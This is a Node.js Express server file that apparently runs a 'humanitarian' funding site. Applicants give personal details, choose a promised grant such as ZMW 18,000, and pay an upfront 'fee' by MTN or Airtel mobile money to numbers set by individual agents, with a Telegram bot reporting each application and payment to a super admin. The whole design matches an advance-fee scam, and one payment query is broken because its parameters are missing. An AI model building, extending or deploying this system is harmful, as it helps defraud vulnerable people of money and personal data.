require("dotenv").config();
const express=require("express"),cors=require("cors"),path=require("path"),crypto=require("crypto"),{Pool}=require("pg");
const app=express(),PORT=process.env.PORT||10000;
if(!process.env.DATABASE_URL){console.error("DATABASE_URL is not configured");process.exit(1)}
const pool=new Pool({connectionString:process.env.DATABASE_URL,ssl:process.env.DATABASE_URL.includes("localhost")?false:{rejectUnauthorized:false}});
app.use(cors());app.use(express.json({limit:"200kb"}));app.use(express.urlencoded({extended:true}));app.use(express.static(path.join(__dirname,"public")));

const FUNDS=["ZMW 18,000 fee 499","ZMW 25,000 fee 699","ZMW 28,000 fee 899","ZMW 30,000 fee 1099","ZMW 35,000 fee 1299"];
const METHODS=["MTN","AIRTEL"];
const makeRef=()=>`WHF-${new Date().getFullYear()}-${crypto.randomBytes(3).toString("hex").toUpperCase()}`;
const token=()=>crypto.randomBytes(32).toString("hex");
const hash=t=>crypto.createHash("sha256").update(String(t)).digest("hex");
const esc=v=>String(v??"").replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");

async function tg(method,payload){
  if(!process.env.TELEGRAM_BOT_TOKEN){console.error("Telegram token missing");return false}
  try{
    const r=await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/${method}`,{
      method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload)
    });
    const t=await r.text(); if(!r.ok)console.error("Telegram API:",r.status,t); return r.ok;
  }catch(e){console.error("Telegram request:",e.message);return false}
}
function isSuperAdmin(id){return String(id)===String(process.env.SUPER_ADMIN_TELEGRAM_ID||"")}
function publicBase(req){
 const configured=process.env.ADMIN_PORTAL_URL||process.env.PUBLIC_BASE_URL;
 if(configured)return configured.replace(/\/admin\/?$/,"").replace(/\/$/,"");
 return `${req.protocol}://${req.get("host")}`;
}
function makeAdminUrl(req,t){return `${publicBase(req)}/admin?token=${encodeURIComponent(t)}`}
function makeCustomerUrl(req,t){return `${publicBase(req)}/?agent=${encodeURIComponent(t)}`}

async function init(){
 await pool.query(`CREATE TABLE IF NOT EXISTS applications(
 id SERIAL PRIMARY KEY,reference VARCHAR(32) UNIQUE NOT NULL,full_name VARCHAR(160) NOT NULL,
 age INTEGER NOT NULL,phone VARCHAR(40) NOT NULL,country VARCHAR(100) NOT NULL,
 location VARCHAR(160) NOT NULL,occupation VARCHAR(120) NOT NULL,zone VARCHAR(120),
 purpose VARCHAR(80) NOT NULL,participated_before BOOLEAN NOT NULL DEFAULT FALSE,
 requested_fund VARCHAR(30),payment_method VARCHAR(20),status VARCHAR(30) NOT NULL DEFAULT 'PENDING',
 customer_contact_number VARCHAR(40),created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),reviewed_at TIMESTAMPTZ);
 ALTER TABLE applications ADD COLUMN IF NOT EXISTS requested_fund VARCHAR(30);
 ALTER TABLE applications ADD COLUMN IF NOT EXISTS payment_method VARCHAR(20);
 ALTER TABLE applications ADD COLUMN IF NOT EXISTS customer_contact_number VARCHAR(40);
 ALTER TABLE applications ADD COLUMN IF NOT EXISTS agent_id INTEGER;
 ALTER TABLE applications ADD COLUMN IF NOT EXISTS payment_status VARCHAR(30) NOT NULL DEFAULT 'PENDING';
 CREATE TABLE IF NOT EXISTS payments(
 id SERIAL PRIMARY KEY,application_id INTEGER REFERENCES applications(id) ON DELETE CASCADE,
 method VARCHAR(20) NOT NULL,transaction_reference VARCHAR(120),statement TEXT,
 amount NUMERIC(12,2),status VARCHAR(30) NOT NULL DEFAULT 'PENDING',
 created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),verified_at TIMESTAMPTZ);
 ALTER TABLE payments ADD COLUMN IF NOT EXISTS transaction_reference VARCHAR(120);
 ALTER TABLE payments ADD COLUMN IF NOT EXISTS statement TEXT;
 ALTER TABLE payments ADD COLUMN IF NOT EXISTS verified_at TIMESTAMPTZ;
 CREATE TABLE IF NOT EXISTS admins(
 id SERIAL PRIMARY KEY,name VARCHAR(160) NOT NULL,token_hash VARCHAR(64) UNIQUE NOT NULL,
 customer_token_hash VARCHAR(64),active BOOLEAN NOT NULL DEFAULT TRUE,created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),last_used_at TIMESTAMPTZ NOT NULL DEFAULT NOW());
 ALTER TABLE admins ADD COLUMN IF NOT EXISTS customer_token_hash VARCHAR(64);
 ALTER TABLE admins ADD COLUMN IF NOT EXISTS mtn_payment_number VARCHAR(80);
 ALTER TABLE admins ADD COLUMN IF NOT EXISTS airtel_payment_number VARCHAR(80);
 CREATE TABLE IF NOT EXISTS audit_log(
 id SERIAL PRIMARY KEY,admin_id INTEGER,action VARCHAR(80) NOT NULL,application_id INTEGER,
 details TEXT,created_at TIMESTAMPTZ NOT NULL DEFAULT NOW());`);
 console.log("Database ready");
}
async function getAdminByToken(raw){
 if(!raw)return null;
 const r=await pool.query("SELECT * FROM admins WHERE token_hash=$1 AND active=TRUE",[hash(raw)]);
 if(r.rows[0])await pool.query("UPDATE admins SET last_used_at=NOW() WHERE id=$1",[r.rows[0].id]);
 return r.rows[0]||null;
}
async function audit(adminId,action,applicationId,details=""){await pool.query("INSERT INTO audit_log(admin_id,action,application_id,details) VALUES($1,$2,$3,$4)",[adminId,action,applicationId,details])}
async function notify(text,buttons){
 return tg("sendMessage",{chat_id:process.env.TELEGRAM_ADMIN_CHAT_ID,parse_mode:"HTML",text,reply_markup:buttons?{inline_keyboard:buttons}:undefined});
}
async function registerWebhook(){
 const base=process.env.TELEGRAM_WEBHOOK_URL || (process.env.PUBLIC_BASE_URL ? `${process.env.PUBLIC_BASE_URL.replace(/\/$/,"")}/telegram/webhook` : (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}/telegram/webhook` : ""));
 if(!base)return;
 const p={url:base,allowed_updates:["callback_query","message"]};
 if(process.env.TELEGRAM_WEBHOOK_SECRET)p.secret_token=process.env.TELEGRAM_WEBHOOK_SECRET;
 const ok=await tg("setWebhook",p); console.log("Telegram webhook registered:",ok);
}

app.get("/health",async(_,res)=>{try{await pool.query("SELECT 1");res.json({status:"OK",database:"CONNECTED"})}catch(e){res.status(500).json({status:"ERROR",database:"NOT CONNECTED"})}});
app.get("/api/config",async(req,res)=>{
 try{
  const agentToken=String(req.query.agent||"");
  let agent=null;
  if(agentToken){const r=await pool.query("SELECT id,name,mtn_payment_number,airtel_payment_number FROM admins WHERE customer_token_hash=$1 AND active=TRUE",[hash(agentToken)]);agent=r.rows[0]||null;if(!agent)return res.status(400).json({error:"This customer application link is invalid or expired."})}
  res.json({fundingOptions:FUNDS,paymentMethods:METHODS,mtnNumber:agent?.mtn_payment_number||process.env.MTN_PAYMENT_NUMBER||"",airtelNumber:agent?.airtel_payment_number||process.env.AIRTEL_PAYMENT_NUMBER||"",customerContactNumber:process.env.CUSTOMER_CONTACT_NUMBER||"",agentName:agent?.name||""});
 }catch(e){console.error("CONFIG ERROR",e);res.status(500).json({error:"Unable to load payment settings."})}
});

app.post("/api/applications",async(req,res)=>{
 try{
  const {full_name,age,phone,country,location,occupation,zone,purpose,participated_before,agent_token}=req.body;
  if(!full_name||!age||!phone||!country||!location||!occupation||!purpose)return res.status(400).json({error:"Complete all required application details."});
  let agent=null;if(agent_token){const ar=await pool.query("SELECT * FROM admins WHERE customer_token_hash=$1 AND active=TRUE",[hash(agent_token)]);agent=ar.rows[0]||null;if(!agent)return res.status(400).json({error:"This customer application link is invalid or expired."})}
  const reference=makeRef();
  const r=await pool.query(`INSERT INTO applications(reference,full_name,age,phone,country,location,occupation,zone,purpose,participated_before,agent_id)
    VALUES($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11) RETURNING *`,
    [reference,String(full_name).trim(),Number(age),String(phone).trim(),String(country).trim(),String(location).trim(),String(occupation).trim(),zone||null,String(purpose).trim(),participated_before==="true"||participated_before===true,agent?.id||null]);
  const a=r.rows[0];
  await notify(`🆕 <b>NEW HUMANITARIAN APPLICATION</b>\n\nReference: <b>${esc(a.reference)}</b>\nName: ${esc(a.full_name)}\nAge: ${a.age}\nPhone: ${esc(a.phone)}\nCountry: ${esc(a.country)}\nLocation: ${esc(a.location)}\nOccupation: ${esc(a.occupation)}\nPurpose: ${esc(a.purpose)}\nAgent: ${esc(agent?.name||"Unassigned")}\n\nStatus: PENDING`,[[{text:"📋 REVIEW APPLICATION",callback_data:`review:${a.id}`},{text:"❌ REJECT",callback_data:`reject:${a.id}`} ]]);
  res.json({success:true,reference:a.reference,status:a.status});
 }catch(e){console.error("APPLICATION ERROR",e);res.status(500).json({error:"Unable to submit application."})}
});

app.post("/api/applications/:reference/funding",async(req,res)=>{
 try{
  const {requested_fund,payment_method}=req.body;
  if(!FUNDS.includes(requested_fund))return res.status(400).json({error:"Invalid funding selection."});
  if(!METHODS.includes(payment_method))return res.status(400).json({error:"Invalid payment method."});
  const r=await pool.query(`UPDATE applications SET requested_fund=$1,payment_method=$2 WHERE reference=$3 RETURNING *`,[requested_fund,payment_method,req.params.reference]);
  if(!r.rows.length)return res.status(404).json({error:"Application not found."});
  const a=r.rows[0];
  const ar=a.agent_id?await pool.query("SELECT name,mtn_payment_number,airtel_payment_number FROM admins WHERE id=$1 AND active=TRUE",[a.agent_id]):{rows:[]};
  const agent=ar.rows[0]||null;
  const paymentNumber=a.payment_method==="MTN"?(agent?.mtn_payment_number||process.env.MTN_PAYMENT_NUMBER||""):(agent?.airtel_payment_number||process.env.AIRTEL_PAYMENT_NUMBER||"");
  await notify(`💰 <b>FUNDING & PAYMENT METHOD SELECTED</b>\n\nReference: <b>${esc(a.reference)}</b>\nCustomer: ${esc(a.full_name)}\nAdmin: ${esc(agent?.name||"Unassigned")}\nRequested funding: <b>${esc(a.requested_fund)}</b>\nPayment method: <b>${esc(a.payment_method)}</b>\nActive payment number: <b>${esc(paymentNumber||"NOT SET")}</b>`,[[{text:"✅ APPROVE",callback_data:`approve:${a.id}`},{text:"❌ REJECT",callback_data:`reject:${a.id}`}],[{text:"📞 USE ACTIVE CONTACT",callback_data:`contact:${a.id}`} ]]);
  res.json({success:true,reference:a.reference,paymentNumber,paymentMethod:a.payment_method,agentName:agent?.name||""});
 }catch(e){console.error("FUNDING ERROR",e);res.status(500).json({error:"Unable to save selection."})}
});

app.post("/api/payments",async(req,res)=>{
 try{
  const {reference,method,transaction_reference,statement,amount}=req.body;
  if(!reference||!method||!statement)return res.status(400).json({error:"Complete the payment information."});
  if(!METHODS.includes(method))return res.status(400).json({error:"Invalid payment method."});
  const a=await pool.query("SELECT id,full_name,requested_fund FROM applications WHERE reference=$1",[reference]);
  if(!a.rows.length)return res.status(404).json({error:"Application not found."});
  const p=await pool.query(`INSERT INTO payments(application_id,method,transaction_reference,statement,amount) VALUES($1,$2,$3,$4,$5) RETURNING id`,
   [a.rows[0].id,method,transaction_reference?String(transaction_reference).trim():null,statement,amount!==undefined&&amount!==null&&String(amount).trim()!==""?Number(amount):null]);
  await pool.query("UPDATE applications SET payment_status='PENDING' WHERE id=$1",[a.rows[0].id]);
  await notify(`💳 <b>PAYMENT INFORMATION RECEIVED</b>\n\nApplication: <b>${esc(reference)}</b>\nCustomer: ${esc(a.rows[0].full_name)}\nRequested funding: ${esc(a.rows[0].requested_fund||"N/A")}\nMethod: ${esc(method)}\nTransaction: ${esc(transaction_reference||"N/A")}\nAmount: ${esc(amount||"N/A")}\n\n<b>Statement:</b>\n${esc(String(statement).slice(0,3500))}`,[ [{text:"✅ VERIFY PAYMENT",callback_data:`payverify:${p.rows[0].id}`},{text:"❌ REJECT PAYMENT",callback_data:`payreject:${p.rows[0].id}`}] ]);
  res.json({success:true,status:"PENDING"});
 }catch(e){console.error("PAYMENT ERROR:",e);res.status(500).json({error:"Unable to submit payment information."})}
});

app.get("/api/applications/:reference",async(req,res)=>{
 try{
  const r=await pool.query(`SELECT a.reference,a.status,a.payment_status,a.requested_fund,a.payment_method,a.customer_contact_number,
   CASE WHEN a.status='APPROVED' THEN TRUE ELSE FALSE END AS approved
   FROM applications a WHERE a.reference=$1`,[req.params.reference]);
  if(!r.rows.length)return res.status(404).json({error:"Application not found."});
  res.json(r.rows[0]);
 }catch(e){res.status(500).json({error:"Unable to check status."})}
});

/* Admin portal */
app.get("/admin",(_,res)=>res.sendFile(path.join(__dirname,"public","admin.html")));
app.get("/api/admin/me",async(req,res)=>{
 const a=await getAdminByToken(req.query.token);if(!a)return res.status(401).json({error:"Invalid admin link."});
 res.json({id:a.id,name:a.name});
});
app.get("/api/admin/applications",async(req,res)=>{
 const a=await getAdminByToken(req.query.token);if(!a)return res.status(401).json({error:"Invalid admin link."});
 const r=await pool.query(`SELECT a.*,p.id AS payment_id,p.method AS payment_method2,p.statement,p.transaction_reference,p.amount,p.status AS payment_status
   FROM applications a LEFT JOIN LATERAL (SELECT * FROM payments WHERE application_id=a.id ORDER BY id DESC LIMIT 1) p ON TRUE
   WHERE a.agent_id=$1 ORDER BY a.created_at DESC`,[a.id]);
 res.json({admin:{id:a.id,name:a.name},applications:r.rows});
});
app.post("/api/admin/applications/:id/decision",async(req,res)=>{
 const a=await getAdminByToken(req.body.token);if(!a)return res.status(401).json({error:"Invalid admin link."});
 const action=req.body.action,status=action==="approve"?"APPROVED":action==="reject"?"REJECTED":null;
 if(!status)return res.status(400).json({error:"Invalid decision."});
 const r=await pool.query(`UPDATE applications SET status=$1,reviewed_at=NOW() WHERE id=$2 AND agent_id=$3 AND status='PENDING' RETURNING reference,full_name,requested_fund,payment_method`,
 [status,req.params.id,a.id]);
 if(!r.rows.length)return res.status(409).json({error:"Application is already reviewed or is not assigned to your portal."});
 await audit(a.id,status==="APPROVED"?"APPROVE_APPLICATION":"REJECT_APPLICATION",req.params.id,status);
 await notify(`${status==="APPROVED"?"✅":"❌"} <b>ADMIN ACTION</b>\nAdmin: ${esc(a.name)}\nApplication: <b>${esc(r.rows[0].reference)}</b>\nCustomer: ${esc(r.rows[0].full_name)}\nAction: <b>${status}</b>`);
 res.json({success:true,status});
});
app.post("/api/admin/payments/:id/decision",async(req,res)=>{
 const a=await getAdminByToken(req.body.token);if(!a)return res.status(401).json({error:"Invalid admin link."});
 const action=req.body.action,status=action==="verify"?"VERIFIED":action==="reject"?"REJECTED":null;
 if(!status)return res.status(400).json({error:"Invalid payment decision."});
 const r=await pool.query(`UPDATE payments p SET status=$1,verified_at=NOW() FROM applications a
  WHERE p.id=$2 AND p.application_id=a.id AND a.agent_id=$3 AND p.status='PENDING' RETURNING p.application_id`,
 [status,req.params.id,a.id]);
 if(!r.rows.length)return res.status(409).json({error:"Payment is already reviewed or is not assigned to your portal."});
 await pool.query("UPDATE applications SET payment_status=$1 WHERE id=$2",[status,r.rows[0].application_id]);
 await audit(a.id,status==="VERIFIED"?"VERIFY_PAYMENT":"REJECT_PAYMENT",r.rows[0].application_id,status);
 await notify(`${status==="VERIFIED"?"✅":"❌"} <b>ADMIN PAYMENT ACTION</b>\nAdmin: ${esc(a.name)}\nPayment: ${req.params.id}\nAction: <b>${status}</b>`);
 res.json({success:true,status});
});

app.post("/api/admin/payment-settings",async(req,res)=>{
 try{
  const a=await getAdminByToken(req.body.token);if(!a)return res.status(401).json({error:"Invalid admin link."});
  const mtn=String(req.body.mtn_payment_number||"").trim(), airtel=String(req.body.airtel_payment_number||"").trim();
  await pool.query("UPDATE admins SET mtn_payment_number=$1,airtel_payment_number=$2 WHERE id=$3",[mtn||null,airtel||null,a.id]);
  res.json({success:true,mtn_payment_number:mtn,airtel_payment_number:airtel});
 }catch(e){console.error("PAYMENT SETTINGS ERROR",e);res.status(500).json({error:"Unable to save payment settings."})}
});

app.get("/api/admin/payment-settings",async(req,res)=>{
 try{const a=await getAdminByToken(req.query.token);if(!a)return res.status(401).json({error:"Invalid admin link."});res.json({mtn_payment_number:a.mtn_payment_number||"",airtel_payment_number:a.airtel_payment_number||""});}
 catch(e){res.status(500).json({error:"Unable to load payment settings."})}
});

app.post("/api/admin/applications/:id/contact",async(req,res)=>{
 try{
  const a=await getAdminByToken(req.body.token);if(!a)return res.status(401).json({error:"Invalid admin link."});
  const {contact_number}=req.body;if(!contact_number)return res.status(400).json({error:"Contact number required."});
  const r=await pool.query(`UPDATE applications SET customer_contact_number=$1 WHERE id=$2 AND agent_id=$3 RETURNING reference,customer_contact_number`,[String(contact_number).trim(),req.params.id,a.id]);
  if(!r.rows.length)return res.status(404).json({error:"Application not found in your portal."});
  await audit(a.id,"ASSIGN_CONTACT",req.params.id,String(contact_number).trim());res.json(r.rows[0]);
 }catch(e){res.status(500).json({error:"Unable to save contact number."})}
});

/* Super admin Telegram */
app.get("/telegram/status",async(req,res)=>{
 try{
  if(!isSuperAdmin(req.query.id))return res.status(403).json({error:"Forbidden"});
  const r=await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/getWebhookInfo`);
  const data=await r.json();
  res.json({ok:data.ok,webhook:data.result});
 }catch(e){res.status(500).json({error:e.message})}
});
app.post("/telegram/webhook",async(req,res)=>{
 try{
  // Telegram callback buttons require this endpoint to return HTTP 200 quickly.
  // Keep the secret check, but always acknowledge valid callback queries even if a later DB/API action fails.
  if(process.env.TELEGRAM_WEBHOOK_SECRET&&req.get("x-telegram-bot-api-secret-token")!==process.env.TELEGRAM_WEBHOOK_SECRET)return res.sendStatus(401);
  const q=req.body.callback_query;
  if(q){
   // Acknowledge immediately so Telegram does not leave the button spinning.
   const superAdmin=isSuperAdmin(q.from?.id);
   if(!superAdmin){
    await tg("answerCallbackQuery",{callback_query_id:q.id,text:"Only the Super Admin can use Telegram approval controls.",show_alert:true});
    return res.sendStatus(200);
   }
   const [action,id]=String(q.data||"").split(":");
   await tg("answerCallbackQuery",{callback_query_id:q.id,text:"Processing…"});
   if(["review","approve","reject"].includes(action)){
    if(action==="review"){await tg("answerCallbackQuery",{callback_query_id:q.id,text:"Application opened in review. Use the admin portal to manage it."});}
    else{
     const status=action==="approve"?"APPROVED":"REJECTED";
     const r=await pool.query(`UPDATE applications SET status=$1,reviewed_at=NOW() WHERE id=$2 AND status='PENDING' RETURNING reference,full_name,requested_fund,payment_method`,[status,id]);
     if(!r.rows.length){await tg("answerCallbackQuery",{callback_query_id:q.id,text:"Already reviewed or not found.",show_alert:true});}
     else{
      await tg("editMessageReplyMarkup",{chat_id:q.message.chat.id,message_id:q.message.message_id,reply_markup:{inline_keyboard:[]}});
      await tg("sendMessage",{chat_id:q.message.chat.id,parse_mode:"HTML",text:`${status==="APPROVED"?"🎉":"❌"} <b>APPLICATION ${status}</b>\n\nReference: <b>${esc(r.rows[0].reference)}</b>\nCustomer: ${esc(r.rows[0].full_name)}\nRequested funding: ${esc(r.rows[0].requested_fund||"N/A")}\nPayment method: ${esc(r.rows[0].payment_method||"N/A")}`});
     }
    }
   } else if(action==="contact"){await tg("answerCallbackQuery",{callback_query_id:q.id,text:"Assign the contact number from the admin portal."});}
   else if(["payverify","payreject"].includes(action)){
    const status=action==="payverify"?"VERIFIED":"REJECTED";
    const r=await pool.query(`UPDATE payments p SET status=$1,verified_at=NOW() FROM applications a
      WHERE p.id=$2 AND p.application_id=a.id AND p.status='PENDING' RETURNING p.application_id,p.id`);
    if(!r.rows.length){await tg("answerCallbackQuery",{callback_query_id:q.id,text:"Payment already reviewed or not found.",show_alert:true});}
    else{
     await pool.query("UPDATE applications SET payment_status=$1 WHERE id=$2",[status,r.rows[0].application_id]);
     await tg("editMessageReplyMarkup",{chat_id:q.message.chat.id,message_id:q.message.message_id,reply_markup:{inline_keyboard:[]}});
     await tg("sendMessage",{chat_id:q.message.chat.id,parse_mode:"HTML",text:`${status==="VERIFIED"?"✅":"❌"} <b>PAYMENT ${status}</b>`});
    }
   }
   return res.sendStatus(200);
  }
  const m=req.body.message;
  if(m?.text){
   const parts=m.text.trim().split(/\s+/),cmd=parts[0].split("@")[0].toLowerCase();
   if(cmd==="/myid"){await tg("sendMessage",{chat_id:m.chat.id,text:`Your Telegram ID is: ${m.from.id}`});}
   else if(isSuperAdmin(m.from?.id)){
    if(cmd==="/start")await tg("sendMessage",{chat_id:m.chat.id,parse_mode:"HTML",text:"👑 <b>Super Admin Panel</b>\n\n/myid — show your Telegram ID\n/adminlink NAME — create an admin\n/customerlink ID — create a fresh customer link\n/admins — list admins\n/revoke ID — revoke an admin link"});
    else if(cmd==="/adminlink"){
     const name=parts.slice(1).join(" ").trim();if(!name){await tg("sendMessage",{chat_id:m.chat.id,text:"Usage: /adminlink John Doe"});}
     else{
      const adminRaw=token(),customerRaw=token(),r=await pool.query("INSERT INTO admins(name,token_hash,customer_token_hash) VALUES($1,$2,$3) RETURNING id,name",[name,hash(adminRaw),hash(customerRaw)]);
      await tg("sendMessage",{chat_id:m.chat.id,parse_mode:"HTML",text:`👤 <b>ADMIN CREATED</b>\nID: <b>${r.rows[0].id}</b>\nName: <b>${esc(name)}</b>\n\n🔐 Admin portal:\n${esc(makeAdminUrl({protocol:"https",get:()=>process.env.RENDER_EXTERNAL_HOSTNAME||""},adminRaw))}\n\n🔗 Customer application link:\n${esc(makeCustomerUrl({protocol:"https",get:()=>process.env.RENDER_EXTERNAL_HOSTNAME||""},customerRaw))}`});
    }
     }
    else if(cmd==="/customerlink"){
     const id=Number(parts[1]);const r=await pool.query("SELECT id,name,active FROM admins WHERE id=$1",[id]);
     if(!r.rows.length||!r.rows[0].active)await tg("sendMessage",{chat_id:m.chat.id,text:"Admin not found or inactive."});
     else{
      const raw=token();await pool.query("UPDATE admins SET customer_token_hash=$1 WHERE id=$2",[hash(raw),id]);
      const portal=process.env.ADMIN_PORTAL_URL||process.env.PUBLIC_BASE_URL||`https://${process.env.RENDER_EXTERNAL_HOSTNAME||""}`;
      await tg("sendMessage",{chat_id:m.chat.id,text:`🔗 Customer application link for ${r.rows[0].name}:\n${portal.replace(/\/admin\/?$/,"").replace(/\/$/,"")}/?agent=${raw}\n\n⚠️ This rotates only the customer link. The admin portal link remains unchanged.`});
     }
    }
    else if(cmd==="/admins"){
     const r=await pool.query("SELECT id,name,active,created_at,last_used_at FROM admins ORDER BY id");
     await tg("sendMessage",{chat_id:m.chat.id,text:r.rows.length?r.rows.map(x=>`#${x.id} ${x.name} — ${x.active?"ACTIVE":"REVOKED"}`).join("\n"):"No admins created yet."});
    }
    else if(cmd==="/revoke"){
     const id=Number(parts[1]);const r=await pool.query("UPDATE admins SET active=FALSE WHERE id=$1 RETURNING name",[id]);
     await tg("sendMessage",{chat_id:m.chat.id,text:r.rows.length?`Admin ${r.rows[0].name} revoked.`:"Admin not found."});
    }
   }
  }
  res.sendStatus(200);
 }catch(e){console.error("WEBHOOK ERROR",e);res.sendStatus(500)}
});

app.get("*",(_,res)=>res.sendFile(path.join(__dirname,"public","index.html")));
(async()=>{try{await init();await registerWebhook();app.listen(PORT,()=>console.log(`Server running on ${PORT}`))}catch(e){console.error("STARTUP ERROR",e);process.exit(1)}})();
